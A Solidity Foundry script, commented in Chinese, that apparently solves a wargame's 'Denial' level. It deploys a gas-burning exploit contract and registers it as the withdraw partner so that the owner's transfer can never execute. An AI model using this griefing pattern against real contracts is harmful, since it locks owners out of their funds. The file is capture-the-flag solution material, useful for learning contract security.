// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import {DenialExploit} from "../src/DenialExploit.sol";

interface IDenial {
    function setWithdrawPartner(address _partner) external;
    function withdraw() external;
}

contract DenialAttackScript is Script {
    function run() external {
        address denialLevel = 0x691eeA9286124c043B82997201E805646b76351a;

        vm.startBroadcast();

        // 1) 部署烧 gas 的攻击合约
        DenialExploit exploit = new DenialExploit();

        // 2) 把 partner 设成攻击合约
        //    之后任何人调用 withdraw, 转给 partner 那一步就会把 gas 烧光,
        //    后面 owner.transfer 永远执行不到 -> 提交时校验会通过
        IDenial(denialLevel).setWithdrawPartner(address(exploit));

        vm.stopBroadcast();

        console.log("exploit deployed at:", address(exploit));
    }
}
